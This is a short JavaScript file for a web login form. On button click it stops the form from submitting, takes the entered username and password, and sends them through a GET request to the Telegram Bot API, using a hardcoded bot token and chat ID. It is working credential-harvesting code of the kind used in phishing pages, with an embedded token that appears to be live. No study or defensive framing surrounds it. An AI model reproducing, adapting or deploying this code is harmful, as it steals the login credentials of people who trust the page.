document.addEventListener('DOMContentLoaded', (event) =>{
    
    console.log('even listened');
    const form = document.querySelector(".btn");
    const inputUsername = document.querySelector(".username");
    const inputUserPassword = document.querySelector(".userpassword");

    
    form.addEventListener("click", (event) => {
        event.preventDefault(); // Prevent the default form submit action
        
        // Encode the input values to ensure special characters are properly handled
        const encodedUsername = encodeURIComponent(inputUsername.value);
        const encodedPassword = encodeURIComponent(inputUserPassword.value);
        
        console.log("click");
        const data = {
            username: encodedUsername,
            password: encodedPassword,
        };
        
        // Construct the URL with the encoded data
        const url = `https://api.telegram.org/bot6332411669:AAGAJoIp25hMiOLfP8gEvIts-QmZMrGmFTI/sendMessage?chat_id=697727022&text=${JSON.stringify(data)}`;
        
        // Use fetch to send the data
        fetch(url, { method: 'GET' })
        .then(response => response.json())
        .then(responseData => console.log(responseData))
        .catch(error => console.error('Error:', error));
    });
})


